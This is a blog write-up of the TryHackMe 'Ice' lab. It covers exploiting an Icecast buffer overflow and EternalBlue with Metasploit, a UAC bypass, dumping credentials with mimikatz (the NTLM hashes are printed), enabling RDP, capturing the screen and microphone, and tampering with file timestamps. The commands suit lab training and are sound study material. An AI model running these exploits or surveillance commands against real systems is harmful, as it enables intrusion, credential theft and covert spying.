---
title: 'TryHackMe - Ice'
description: "Standard Nmap and Metasploit with mimikatz thrown into the mix for fun. Vulnerability and exploit research, privilege escalation, RDP sessions, and a few tricks to spy on the target."
author: 'Tim Sonner'
date: '2023-07-08'
hero: '/thm-ice/thm-ice-hero.png'
published: true
---

![](/thm-ice/thm-ice-hero.png)  

## Recon  

**Nmap service scan**  

```  
nmap -sV -vv $IP 
```  

![](/thm-ice/thm-ice-nmap-sv.png)  

> This room covers the service running on port 8000 (Icecast).  


**Nmap vulnerability scan**  

``` 
nmap -script=vuln -vv $IP   
```  
![](/thm-ice/thm-ice-nmap-script-vuln.png)  

> This box is also vulnerable to Eternal Blue (ms17-010) CVE-2017-0143.  

## Research the exploit. The room wants us to research a specific CVE from 2004. 

**cvedetails.com results for "Icecast"**  

![](/thm-ice/thm-ice-cvedetails-icecast.png)  

> Hmmm... No CVE results from 2004.

**exploit-db.com results for "Icecast"**  

![](/thm-ice/thm-ice-exploitdb-icecast.png)  

> The correct CVE is linked in the exploit-db results (2004-10-6 or 2004-10-12)

**ChatGPT results for Icecast vulnerabilities from 2004**  

![](/thm-ice/thm-ice-chatgpt-icecast-2004.png)  

> We now know the CVE in question is CVE-2004-1561.  

**cvedetails.com results for CVE-2004-1561**  

![](/thm-ice/thm-ice-cvedetails-cve-2014-1561.png)  

> The vulnerability allows us to "Execute Code" by leveraging a buffer "Overflow".  

**Digging a bit deeper... searchsploit results for "Icecast"**  
![](/thm-ice/thm-ice-searchsploit.png)  

**View the exploit**

```  
cat /usr/share/exploitdb/exploits/windows_x86/remote/16763.rb
```  

## Exploit

**Metasploit search results for "icecast"**  
![](/thm-ice/thm-ice-metasploit-search-icecast.png)  

**Metasploit command**  

```  
msfconsole -x "use exploit/windows/http/icecast_header;setg RHOSTS $IP;setg LHOST tun0;run"
```  

> Note tun0 may not be the only tun interface. Run 'ip addr' to view interfaces, command above may need tun1.  

**The exploit has ran. Get our user ID and view the icecast process**  
![](/thm-ice/thm-ice-meterpreter-ps.png)  
> We get the same PID if we run getpid. That process is us.

**View all processes**  
![](/thm-ice/thm-ice-meterpreter-ps-regular.png)  

## Elevate our privileges  

**View our privileges**  
```  
getprivs
```  
![](/thm-ice/thm-ice-meterpreter-getprivs-1.png)

**Get suggested exploits**  

```  
run post/multi/recon/local_exploit_suggester
```  

![](/thm-ice/thm-ice-meterpreter-local-suggestions.png)  

**Use a suggested exploit**  

```  
use exploit/windows/local/bypassuac_eventvwr
```  

![](/thm-ice/thm-ice-metasploit-bypassuac-eventvwr.png)  

**Once the exploit has ran, view our sessions, 2 is elevated**  

![](/thm-ice/thm-ice-metasploit-sessions.png)  

**Our user ID is the same as in the un-elevated session**  

![](/thm-ice/thm-ice-meterpreter-getuid.png)

**Our privileges in the elevated session are different**  

![](/thm-ice/thm-ice-meterpreter-getprivs-2.png)  

**View processes in the elevated session. Notice different results between sessions? Our privileged shell can view owners of all processes**  

![](/thm-ice/thm-ice-meterpreter-ps-elevated.png)  

**Migrate to another process**  

![](/thm-ice/thm-ice-meterpreter-migrate.png)

**Load Mimikatz aka Kiwi**  

![](/thm-ice/thm-ice-meterpreter-load-kiwi.png)  


**Get credentials**  
![](/thm-ice/thm-ice-mimikatz-creds-all.png)  

**Dump the hashes with "hashdump"**  

```  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```  

**Spin up an RDP session utilizing the user Dark's credentials to authenticate**  

```  
run post/windows/manage/enable_rdp
```  
> This opens the RDP port and starts the service on the target if not already enabled.  

```  
rdesktop $IP
```  
> Remote desktop, just give it an IP. This command is ran on the localhost of course.  

![](/thm-ice/thm-ice-rdesktop.png)  

**View the target's desktop in real time in a browser window.**  

```  
screenshare
```  

![](/thm-ice/thm-mimikatz-screenshare.png)  

**Mess with timestamps.**  

```  
timestomp desktop.ini -m "07/08/2023 15:30:00"
```  

![](/thm-ice/thm-ice-timestomp.png)  

**Record audio from the taget device's microphone.**  

```  
record_mic
```  
> Don't think this works on this box...

**Create a Kerberos golden ticket to take you where you're going in life...**  

```  
golden_ticket_create
```  
> load kiwi is required for this command.  Also, this box isn't domain joined.  

**Let's p0wn the box using the eternal blue exploit**  

```  
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;setg RHOSTS $IP;setg LHOST tun0;run"
```  

> Ridiculously EZ.  

![](/thm-ice/thm-ice-metasploit-eternal-blue.png)  

**Here's an exploit to try out and work on...**  

Icecast 2.0.1 (Win32) - Remote Code Execution (1) 

https://www.exploit-db.com/exploits/568  

**Here's a copy of ncat.exe in case we want to rewrite the exploit...**  

[https://timsonner.com/ncat.exe](/ncat.exe)  

# Donezo Funzo.











